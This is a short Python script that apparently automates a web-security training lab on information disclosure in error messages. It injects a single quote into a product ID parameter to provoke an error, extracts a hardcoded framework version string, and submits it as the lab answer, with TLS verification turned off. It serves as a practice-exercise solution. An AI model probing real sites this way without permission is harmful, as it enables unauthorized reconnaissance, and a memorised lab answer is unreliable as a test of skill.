import requests
from colorama import Fore
import urllib3
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Information disclosure in error messages"


def run(url, payload=None, proxies=None):
    url = url.rstrip('/')

    print("[1] Injecting a single quote in the productId parameter to cause an error")
    product = requests.get(f"{url}/product?productId=4'", allow_redirects=False,
                           verify=False, proxies=proxies)

    print("[2] Extracting the framework name")
    framework_name = re.findall("Apache Struts 2 2.3.31", product.text)[0]
    print(Fore.GREEN + "framework name" + Fore.WHITE +
          " => " + Fore.YELLOW + framework_name)

    print("[3] Submitting the solution")
    data = {"answer": framework_name}

    print("[+] Refresh the page if needed")

    requests.post(f"{url}/submitsolution", data=data, allow_redirects=False,
                  verify=False, proxies=proxies)
    return True
